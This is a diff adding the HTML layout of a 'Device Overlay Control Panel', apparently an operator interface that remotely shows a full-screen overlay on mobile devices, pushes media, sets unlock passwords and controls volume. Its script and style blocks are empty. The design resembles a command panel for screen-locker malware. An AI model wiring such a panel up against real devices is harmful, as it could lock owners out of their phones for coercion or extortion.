@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Device Overlay Control Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+      
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="material-icons">screen_lock_portrait</i> Device Overlay Control</h1>
+            <p>Real-time control panel for mobile device overlay service</p>
+        </div>
+
+        <div class="content">
+            <div class="content-in">
+                <!-- Live Status -->
+                <div class="devices-list">
+                    <h4 style="margin-bottom: 16px; color: #e2e8f0;">📱 Live Device Status</h4>
+                    <div id="liveStatus">Waiting for device connection...</div>
+                </div>
+                
+                <!-- Status Card -->
+                <div id="statusCard" class="status-card">
+                    <div class="status-indicator" id="statusIndicator"></div>
+                    <div>
+                        <div id="statusText">Initializing...</div>
+                        <div id="deviceInfo" style="font-size: 0.9rem; opacity: 0.8;"></div>
+                    </div>
+                </div>
+
+                <!-- Main Controls -->
+                <div class="control-grid">
+                    <!-- Overlay Toggle -->
+                    <div class="control-card">
+                        <h3><i class="material-icons">visibility</i> Overlay Control</h3>
+                        <div class="form-group">
+                            <label>Overlay Status</label>
+                            <div class="btn-group">
+                                <button id="overlayOn" class="btn btn-success">🟢 SHOW</button>
+                                <button id="overlayOff" class="btn btn-danger">🔴 HIDE</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Media Type -->
+                    <div class="control-card">
+                        <h3><i class="material-icons">play_circle</i> Media Type</h3>
+                        <select id="mediaType" class="form-control">
+                            <option value="">No Media</option>
+                            <option value="video">🎥 Video</option>
+                            <option value="audio">🎵 Audio</option>
+                            <option value="image">🖼️ Image</option>
+                        </select>
+                        <input id="mediaUrl" type="url" class="form-control" placeholder="https://example.com/video.mp4">
+                    </div>
+
+                    <!-- Content -->
+                    <div class="control-card">
+                        <h3><i class="material-icons">title</i> Content</h3>
+                        <input id="overlayTitle" type="text" class="form-control" placeholder="System Maintenance">
+                        <input id="overlaySubtitle" type="text" class="form-control" placeholder="Contact administrator">
+                    </div>
+
+                    <!-- 🔥 PASSWORD SECTION -->
+                    <div class="control-card">
+                        <h3><i class="material-icons">lock</i> Unlock Settings</h3>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="unlockEnabled">
+                            <span>Enable Password Unlock</span>
+                        </div>
+                        <input id="overlayPassword" type="password" class="form-control" placeholder="Enter unlock password">
+                        <button id="sendPasswordBtn" class="btn btn-primary" style="margin-top: 12px;">🔑 SEND PASSWORD</button>
+                    </div>
+
+                    <div class="control-card volume-compact">
+                        <h3><i class="material-icons">volume_up</i> Volume Control</h3>
+                        <div class="volume-display">
+                            <div class="volume-value" id="volumeValue">100%</div>
+                            <div style="color: #94a3b8; font-size: 0.9rem; margin-top: 4px;">🔄 Real-time sync with device slider</div>
+                        </div>
+                        <div class="volume-slider-container">
+                            <input type="range" id="volumeSlider" class="custom-volume-slider" min="0" max="100" value="100" step="1">
+                            <div class="volume-info">
+                                <span>0%</span>
+                                <span id="volumePercent">100%</span>
+                                <span>100%</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 🔥 GLOBAL DEPLOY BUTTON -->
+                <div class="control-card">
+                    <h3><i class="material-icons">send</i>SEND COMMAND</h3>
+                    <div class="btn-group">
+                        <button id="deployAll" class="btn btn-primary">SEND ALL</button>
+                        <button id="testVideo" class="btn btn-success">TEST VIDEO</button>
+                        <button id="clearAll" class="btn btn-secondary">CLEAR ALL</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK v10 CDN -->
+    <script type="module">
+
+    </script>
+</body>
+</html>
